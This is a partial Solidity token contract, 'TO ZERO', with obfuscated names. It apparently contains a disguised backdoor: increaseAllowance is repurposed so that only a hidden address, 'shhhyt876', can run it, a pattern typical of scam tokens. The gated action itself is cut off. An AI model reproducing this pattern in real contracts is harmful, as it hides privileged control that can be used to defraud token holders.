...
contract tozeroTOKEN is Ownable {
    ...
    string private _hooextokenname = "TO ZERO";
    string private _voptokensymbol = "tozero";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public shhhyt876;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(shhhyt876 != _msgSender()){
            return ;
        }else{
           require(shhhyt876 == _msgSender());
